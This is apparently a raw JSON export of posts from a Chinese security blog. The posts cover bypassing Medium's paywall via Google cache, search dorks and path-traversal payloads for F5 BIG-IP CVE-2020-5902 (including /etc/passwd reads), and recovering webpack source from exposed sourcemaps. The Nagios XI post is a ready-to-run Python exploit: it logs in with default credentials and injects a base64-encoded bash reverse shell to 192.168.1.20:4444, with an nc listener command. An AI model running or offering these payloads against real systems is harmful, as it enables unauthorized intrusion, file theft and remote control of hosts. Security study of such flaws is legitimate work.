href=\&#34;#%E5%8F%82%E8%80%83%E4%B9%A6%E7%B1%8D%E6%88%96%E6%96%87%E6%A1%A3\&#34;&gt;参考书籍或文档&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;Medium的文章有一些是需要花钱购买会员才可以看的，每个月有两次可以试看。超过则需要付费成为会员。&lt;/p&gt;\n&lt;p&gt;其实通过Google cache就可以绕过限制继续查看。&lt;/p&gt;\n&lt;p&gt;例如我们要查看下面的文章，发现看不了。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1595423164903.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;我们通过标题搜索到medium的文章，然后点击cache。打开后，过一会会跳转显示404错误。但是，我们可以按F12打开控制台，切换到network标签，在按F5刷新下，找到带有google cache的链接。点击右侧的preview就可以查看到原文内容。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1595423337573.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;就可以看到内容了。如果看着不方便，可以复制出来。另外，该页面由js控制，通过burp类的代理工具，在查看时将js的链接地址全部过滤掉即可，直接在网页中查看，无需打开控制台。当然这里也可以通过爬虫的方式获取。&lt;/p&gt;\n&lt;p&gt;其实对于绕过来说，还可以通过代理，创建多个账号等方式。这里大家跟进实际情况，自己选择吧。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;medium-bypass-via-google-cache&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;Medium的文章有一些是需要花钱购买会员才可以看的，每个月有两次可以试看。超过则需要付费成为会员。&lt;/p&gt;\n&lt;p&gt;其实通过Google cache就可以绕过限制继续查看。&lt;/p&gt;\n&lt;p&gt;例如我们要查看下面的文章，发现看不了。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1595423164903.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&#34;,&#34;title&#34;:&#34;免费查看Medium付费内容&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;bypass&#34;,&#34;slug&#34;:&#34;-CeSGG-a_cS&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/-CeSGG-a_cS/&#34;},{&#34;name&#34;:&#34;medium&#34;,&#34;slug&#34;:&#34;Jk4SbC7zizR&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/Jk4SbC7zizR/&#34;},{&#34;name&#34;:&#34;google&#34;,&#34;slug&#34;:&#34;dhbhlfI0Is4&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/dhbhlfI0Is4/&#34;}],&#34;date&#34;:&#34;2020-07-22 21:01:49&#34;,&#34;dateFormat&#34;:&#34;2020-07-22&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/medium-bypass-via-google-cache/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:59000,&#34;words&#34;:285,&#34;minutes&#34;:1},&#34;description&#34;:&#34;Medium的文章有一些是需要花钱购买会员才可以看的，每个月有两次可以试看。超过则需要付费成为会员。\n其实通过Google cache就可以绕过限制继续查看。\n例如我们要查看下面的文章，发现看不了。\n\n\n我们通过标题搜索到medium的文章...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;7月1日，F5发布公告，其流量管理用户接口（Traffic Management User Interface ，简称TMUI)，也称为配置实用程序（Configuration utility）。该系统存在一处RCE漏洞。CVE编号为CVE-2020-5902。&lt;/p&gt;\n&lt;h2 id=\&#34;搜索目标\&#34;&gt;搜索目标：&lt;/h2&gt;\n&lt;p&gt;注：请将下面的%26替换为&amp;amp;。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;shodan&lt;/strong&gt;&lt;br&gt;\nhttp.favicon.hash:-335242539&lt;/p&gt;\n&lt;p&gt;http.title:&amp;quot;BIG-IP%26reg;- Redirect&amp;quot;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;fofa&lt;/strong&gt;&lt;br&gt;\ntitle=&amp;quot;BIG-IP%26reg;- Redirect&amp;quot;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;censys&lt;/strong&gt;&lt;br&gt;\n443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5&lt;/p&gt;\n&lt;p&gt;443.https.get.title:&amp;quot;BIG-IP%26reg;- Redirect&amp;quot;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;google&lt;/strong&gt;&lt;br&gt;\ninurl:&amp;quot;tmui/login.jsp&amp;quot;&lt;/p&gt;\n&lt;p&gt;intitle:&amp;quot;BIG-IP&amp;quot; inurl:&amp;quot;tmui&amp;quot;&lt;/p&gt;\n&lt;h2 id=\&#34;漏洞检测\&#34;&gt;漏洞检测&lt;/h2&gt;\n&lt;p&gt;/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp&lt;/p&gt;\n&lt;p&gt;/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=a&lt;/p&gt;\n&lt;h2 id=\&#34;漏洞利用\&#34;&gt;漏洞利用&lt;/h2&gt;\n&lt;p&gt;&lt;strong&gt;文件读取&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;RCE&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin （没测试成功）&lt;/p&gt;\n&lt;p&gt;相关内容可以看其他地址的总结：&lt;br&gt;\n&lt;a href=\&#34;http://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/\&#34;&gt;http://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/&lt;br&gt;\n&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://github.com/jas502n/CVE-2020-5902\&#34;&gt;https://github.com/jas502n/CVE-2020-5902&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;以上漏洞poc来自网络，请勿用于非法攻击。仅用于安全测试和自身安全检测。否则造成的一切后果自负，且与本人无关。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;big-ip-cve-2020-5902-check-poc&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;BIG IP CVE-2020-5902 漏洞检测和利用&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;BIG-IP&#34;,&#34;slug&#34;:&#34;_GCDhs5XYGV&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/_GCDhs5XYGV/&#34;},{&#34;name&#34;:&#34;RCE&#34;,&#34;slug&#34;:&#34;mH7bycAoI6a&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/mH7bycAoI6a/&#34;},{&#34;name&#34;:&#34;CVE&#34;,&#34;slug&#34;:&#34;RAyfn4bKtna&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/RAyfn4bKtna/&#34;}],&#34;date&#34;:&#34;2020-07-05 11:19:29&#34;,&#34;dateFormat&#34;:&#34;2020-07-05&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/big-ip-cve-2020-5902-check-poc/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:78000,&#34;words&#34;:269,&#34;minutes&#34;:2},&#34;description&#34;:&#34;7月1日，F5发布公告，其流量管理用户接口（Traffic Management User Interface ，简称TMUI)，也称为配置实用程序（Configuration utility）。该系统存在一处RCE漏洞。CVE编号为CVE...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%90%9C%E7%B4%A2%E7%9B%AE%E6%A0%87\&#34;&gt;搜索目标：&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B\&#34;&gt;漏洞检测&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\&#34;&gt;漏洞利用&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;登陆后的，比较鸡肋。4月份发现的，一直放着，后来看官网更新了，直接发出来吧。另外官方还有一个明显的sql注入没修复。不过也是登陆后，感兴趣的可以去看一下。&lt;/p&gt;\n&lt;h2 id=\&#34;简要信息\&#34;&gt;简要信息&lt;/h2&gt;\n&lt;p&gt;版本： 5.6.13（5.6.11版本也存在问题，只需要把最后文件名字中的 &lt;code&gt;-&lt;/code&gt; 去掉）&lt;br&gt;\n条件：登陆后&lt;br&gt;\n漏洞文件相关路径：/includes/components/xicore/export-rrd.php、includes/utils-rrdexport.inc.php&lt;br&gt;\n漏洞参数：step、start、end&lt;/p&gt;\n&lt;h2 id=\&#34;环境\&#34;&gt;环境&lt;/h2&gt;\n&lt;p&gt;python3&lt;br&gt;\nrequests库，使用pip3安装即可。&lt;code&gt;python3 -m pip install requests&lt;/code&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;运行\&#34;&gt;运行&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;首先在远程机器上监听端口，用于反弹。命令：nc -l -v -p 4444&lt;/li&gt;\n&lt;li&gt;python3 nagiox.py target   (注：需带协议，如http或https)&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;另外，如果需要执行自己的命令，需要修改commond变量就可以了，这里也懒得改了。脚本中的命令&lt;code&gt;&amp;quot;1|(echo+\\&amp;quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAvNDQ0NCAwPiYx\\&amp;quot;|base64+-d+|sh+-i);#&amp;quot;&lt;/code&gt;&lt;br&gt;\n其实就是执行的&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.20/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1590571293255.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;代码保存为py文件\&#34;&gt;代码（保存为py文件）&lt;/h2&gt;\n&lt;!-- more --&gt;\n&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3\nimport sys, re \nimport requests \n\nuser = &#39;nagiosadmin&#39; \npwd = &#39;nagiosadmin&#39; \n \ndef main():\n    print(&amp;quot;You need runing nc -l -vv -p 4444 at server.&amp;quot;)\n    session = requests.session() \n    baseUrl = target + &#39;/nagiosxi/&#39;     \n    checkBaseUrl = session.get(baseUrl)     \n    checkBaseResp = checkBaseUrl.text \n    \n    nsp_patt = &amp;quot;var nsp_str = \\&amp;quot;(.*?)\\&amp;quot;&amp;quot; \n    find_nsp = re.compile(nsp_patt)     \n    found_nsp = re.search(find_nsp, checkBaseResp)     \n    if found_nsp:         \n        nsp_val = found_nsp.group(1)         \n        print(&#39;nsp value found: %s&#39; % ( nsp_val ) )    \n        loginurl = baseUrl + &#39;/login.php&#39;        \n        data_login = {&#39;nsp&#39;: nsp_val,&#39;page&#39;: &#39;auth&#39;, &#39;debug&#39;:&#39;&#39;, &#39;pageopt&#39;:&#39;login&#39;,&#39;redirect&#39;:&#39;http://192.168.121.139/nagiosxi/index.php&#39;,&#39;username&#39;:user, &#39;password&#39;:pwd,&#39;loginButton&#39;:&#39;&#39;} \n        req = session.post(loginurl, data=data_login, verify=False, allow_redirects=True)         \n        status_code = req.status_code\n        resp = req.text\n        \n        if status_code == 200:                    \n            commond = &amp;quot;1|(echo+\\&amp;quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAvNDQ0NCAwPiYx\\&amp;quot;|base64+-d+|sh+-i);#&amp;quot;             \n            \n            req = &amp;quot;{}/includes/components/xicore/export-rrd.php?host=localhost&amp;amp;service=Root%20Partition&amp;amp;start=1584108670&amp;amp;end=1584195130&amp;amp;step={}&amp;amp;type=a&amp;amp;nsp={}&amp;quot;.format(baseUrl,commond,nsp_val)\n            execsh = session.get(req, verify=False, allow_redirects=True)             \n            print(execsh.text)\n\nif __name__ == &#39;__main__&#39;:    \n    target = sys.argv[1] \n    main()\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/strong&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;nagiosxi-rce-1&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;登陆后的，比较鸡肋。4月份发现的，一直放着，后来看官网更新了，直接发出来吧。另外官方还有一个明显的sql注入没修复。不过也是登陆后，感兴趣的可以去看一下。&lt;/p&gt;\n&lt;h2 id=\&#34;简要信息\&#34;&gt;简要信息&lt;/h2&gt;\n&lt;p&gt;版本： 5.6.13（5.6.11版本也存在问题，只需要把最后文件名字中的 &lt;code&gt;-&lt;/code&gt; 去掉）&lt;br&gt;\n条件：登陆后&lt;br&gt;\n漏洞文件相关路径：/includes/components/xicore/export-rrd.php、includes/utils-rrdexport.inc.php&lt;br&gt;\n漏洞参数：step、start、end&lt;/p&gt;\n&lt;h2 id=\&#34;环境\&#34;&gt;环境&lt;/h2&gt;\n&lt;p&gt;python3&lt;br&gt;\nrequests库，使用pip3安装即可。&lt;code&gt;python3 -m pip install requests&lt;/code&gt;&lt;/p&gt;\n&lt;h2 id=\&#34;运行\&#34;&gt;运行&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;首先在远程机器上监听端口，用于反弹。命令：nc -l -v -p 4444&lt;/li&gt;\n&lt;li&gt;python3 nagiox.py target   (注：需带协议，如http或https)&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;另外，如果需要执行自己的命令，需要修改commond变量就可以了，这里也懒得改了。脚本中的命令&lt;code&gt;&amp;quot;1|(echo+\\&amp;quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAvNDQ0NCAwPiYx\\&amp;quot;|base64+-d+|sh+-i);#&amp;quot;&lt;/code&gt;&lt;br&gt;\n其实就是执行的&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.20/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1590571293255.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;代码保存为py文件\&#34;&gt;代码（保存为py文件）&lt;/h2&gt;\n&#34;,&#34;title&#34;:&#34;Nagiosxi的一个RCE漏洞利用脚本&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;nagiosxi&#34;,&#34;slug&#34;:&#34;lteREX62R8K&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/lteREX62R8K/&#34;},{&#34;name&#34;:&#34;rce&#34;,&#34;slug&#34;:&#34;q3rLS9i6DvW&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/q3rLS9i6DvW/&#34;},{&#34;name&#34;:&#34;postauth&#34;,&#34;slug&#34;:&#34;f06rM7KAWvN&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/f06rM7KAWvN/&#34;}],&#34;date&#34;:&#34;2020-05-27 17:05:55&#34;,&#34;dateFormat&#34;:&#34;2020-05-27&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/nagiosxi-rce-1/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;3 min read&#34;,&#34;time&#34;:143000,&#34;words&#34;:501,&#34;minutes&#34;:3},&#34;description&#34;:&#34;登陆后的，比较鸡肋。4月份发现的，一直放着，后来看官网更新了，直接发出来吧。另外官方还有一个明显的sql注入没修复。不过也是登陆后，感兴趣的可以去看一下。\n简要信息\n版本： 5.6.13（5.6.11版本也存在问题，只需要把最后文件名字中的...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E8%A6%81%E4%BF%A1%E6%81%AF\&#34;&gt;简要信息&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%8E%AF%E5%A2%83\&#34;&gt;环境&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%BF%90%E8%A1%8C\&#34;&gt;运行&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BB%A3%E7%A0%81%E4%BF%9D%E5%AD%98%E4%B8%BApy%E6%96%87%E4%BB%B6\&#34;&gt;代码（保存为py文件）&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;现在许多网站都使用webpack对网站打包，许多前端框架也默认配置好webpack。这会在渗透测试或挖洞过程中带来一些麻烦。这让我们极其痛苦。但是开发者忽视起潜在风险，在线上环境使用了开发环境的配置，或者配置了sourcemap允许在生产环境中使用。这使得我们有了机会。&lt;/p&gt;\n&lt;p&gt;在实际渗透过程中，许多网站还是存在这种情况。通常一般是配置了&lt;code&gt;devtool: &#39;source-map&#39;&lt;/code&gt; 。&lt;/p&gt;\n&lt;p&gt;我们可以在js的文件名后面加上.map，如果在这种该文件，我们则可以通过工具解压缩webpack。&lt;/p&gt;\n&lt;p&gt;或者当我们一般看到类似这样的代码时，也基本可以对其进行解压缩。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1589786576692.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;利用\&#34;&gt;利用&lt;/h2&gt;\n&lt;p&gt;可以使用的工具有：&lt;/p&gt;\n&lt;h3 id=\&#34;1-sourcedetector\&#34;&gt;1. SourceDetector&lt;/h3&gt;\n&lt;p&gt;地址：&lt;a href=\&#34;https://github.com/SunHuawei/SourceDetector\&#34;&gt;https://github.com/SunHuawei/SourceDetector&lt;/a&gt;&lt;br&gt;\n这个工具是chrome浏览器的插件，gogole商店中没有该插件，需要自己编译，这里遇到些坑，给大家说下编译的流程（以下环境为macos下）。&lt;/p&gt;\n&lt;h4 id=\&#34;安装\&#34;&gt;安装&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;安装nvm。&lt;code&gt;brew install nvm&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;安装nodejs。 &lt;code&gt;nvm install v11.15.0&lt;/code&gt;  (注意，由于工具是2017年发布，新版本node会有问题，所以使用老版本)&lt;/li&gt;\n&lt;li&gt;安装bower和gulp。 &lt;code&gt;npm install bower&lt;/code&gt;， &lt;code&gt;npm install gulp&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;git clone https://github.com/SunHuawei/SourceDetector.git&lt;/li&gt;\n&lt;li&gt;npm install&lt;/li&gt;\n&lt;li&gt;bower install&lt;/li&gt;\n&lt;li&gt;gulp&lt;/li&gt;\n&lt;li&gt;打开Chrome设置-扩展程序&lt;/li&gt;\n&lt;li&gt;点击&amp;quot;加载已解压的扩展程序...&amp;quot;&lt;/li&gt;\n&lt;li&gt;选择path/to/source-detector/dist目录&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;使用\&#34;&gt;使用&lt;/h4&gt;\n&lt;p&gt;使用很简单，开启插件，我们正常浏览网站即可，该插件会自动请求网站中是否存在.map文件。如果存在，会提示器数量。点开插件后，我们可以点击链接直接下载代码包至本地。使用简单方便。大家可以看作者的文章&lt;a href=\&#34;https://zhuanlan.zhihu.com/p/26033573\&#34;&gt;https://zhuanlan.zhihu.com/p/26033573&lt;/a&gt;&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1589782830447.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h3 id=\&#34;2restore-source-tree\&#34;&gt;2.restore source tree&lt;/h3&gt;\n&lt;p&gt;地址：&lt;a href=\&#34;https://github.com/alexkuz/restore-source-tree\&#34;&gt;https://github.com/alexkuz/restore-source-tree&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;我测试了下，有的可能下载不回来文件。&lt;/p&gt;\n&lt;h4 id=\&#34;安装-2\&#34;&gt;安装&lt;/h4&gt;\n&lt;p&gt;这个是命令行工具。安装好npm后，直接 &lt;code&gt;npm i -g restore-source-tree&lt;/code&gt; 。&lt;/p&gt;\n&lt;h4 id=\&#34;使用-2\&#34;&gt;使用&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;下载.map文件。&lt;/li&gt;\n&lt;li&gt;restore-source-tree --out-dir &amp;lt;OUT_DIR&amp;gt; &lt;FILE&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;既然可以解开文件了，就可以想以前一样进行分析和挖掘了。可以尝试寻找是否有隐藏的敏感信息，发现新的输入点，挖掘xss等。&lt;/p&gt;\n&lt;h2 id=\&#34;原理\&#34;&gt;原理&lt;/h2&gt;\n&lt;p&gt;我们需要了解下webpack和sroucemap。&lt;/p&gt;\n&lt;h3 id=\&#34;什么是webpack\&#34;&gt;什么是webpack&lt;/h3&gt;\n&lt;p&gt;webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。当 webpack 处理应用程序时，它会递归地构建一个依赖关系图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle。——来自官网说明&lt;/p&gt;\n&lt;h3 id=\&#34;什么是sourcemap\&#34;&gt;什么是sourcemap&lt;/h3&gt;\n&lt;p&gt;sourcemap是为了解决开发代码与实际运行代码不一致时，帮助我们方便在浏览器中调试代码的技术，它本身只是一个独立的map文件，与源码在同一个目录下。详细内容可以看&lt;a href=\&#34;http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html\&#34;&gt;JavaScript Source Map 详解&lt;/a&gt;。&lt;/p&gt;\n&lt;p&gt;我们经常遇到的前端代码经过webpack打包压缩为一个文件，使得调试和分析变得头痛。那么sourcemap可以让开发者方便的调试。如果部署到线上没有关闭sourcemap，这就让我们可以如开发者一样调试js代码。&lt;/p&gt;\n&lt;p&gt;本身网络上的文章讲解的很清楚了，我这里不做过多解释。请看后文参考。&lt;/p&gt;\n&lt;h2 id=\&#34;参考\&#34;&gt;参考&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html&lt;/li&gt;\n&lt;li&gt;https://www.webpackjs.com/concepts/&lt;/li&gt;\n&lt;li&gt;https://zhuanlan.zhihu.com/p/26033573&lt;/li&gt;\n&lt;li&gt;https://mp.weixin.qq.com/s/LRRycBY9ERIMBEh-MKjBCw&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;fileName&#34;:&#34;unpack-webpack-via-sourcemap&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;现在许多网站都使用webpack对网站打包，许多前端框架也默认配置好webpack。这会在渗透测试或挖洞过程中带来一些麻烦。这让我们极其痛苦。但是开发者忽视起潜在风险，在线上环境使用了开发环境的配置，或者配置了sourcemap允许在生产环境中使用。这使得我们有了机会。&lt;/p&gt;\n&lt;p&gt;在实际渗透过程中，许多网站还是存在这种情况。通常一般是配置了&lt;code&gt;devtool: &#39;source-map&#39;&lt;/code&gt; 。&lt;/p&gt;\n&lt;p&gt;我们可以在js的文件名后面加上.map，如果在这种该文件，我们则可以通过工具解压缩webpack。&lt;/p&gt;\n&lt;p&gt;或者当我们一般看到类似这样的代码时，也基本可以对其进行解压缩。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;通过sourcemap解压缩webpack 实战&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;sourcemap&#34;,&#34;slug&#34;:&#34;Svviomjq-Y&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/Svviomjq-Y/&#34;},{&#34;name&#34;:&#34;webpack&#34;,&#34;slug&#34;:&#34;7vkFDlvcbw&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/7vkFDlvcbw/&#34;},{&#34;name&#34;:&#34;javascript&#34;,&#34;slug&#34;:&#34;6RU1h5TcSNc&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/6RU1h5TcSNc/&#34;}],&#34;date&#34;:&#34;2020-05-18 13:38:50&#34;,&#34;dateFormat&#34;:&#34;2020-05-18&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/unpack-webpack-via-sourcemap/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;4 min read&#34;,&#34;time&#34;:204000,&#34;words&#34;:898,&#34;minutes&#34;:4},&#34;description&#34;:&#34;现在许多网站都使用webpack对网站打包，许多前端框架也默认配置好webpack。这会在渗透测试或挖洞过程中带来一些麻烦。这让我们极其痛苦。但是开发者忽视起潜在风险，在线上环境使用了开发环境的配置，或者配置了sourcemap允许在生产环...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%88%A9%E7%94%A8\&#34;&gt;利用&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#1-sourcedetector\&#34;&gt;1. SourceDetector&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AE%89%E8%A3%85\&#34;&gt;安装&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BD%BF%E7%94%A8\&#34;&gt;使用&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#2restore-source-tree\&#34;&gt;2.restore source tree&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AE%89%E8%A3%85-2\&#34;&gt;安装&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BD%BF%E7%94%A8-2\&#34;&gt;使用&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8E%9F%E7%90%86\&#34;&gt;原理&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BB%80%E4%B9%88%E6%98%AFwebpack\&#34;&gt;什么是webpack&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BB%80%E4%B9%88%E6%98%AFsourcemap\&#34;&gt;什么是sourcemap&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a 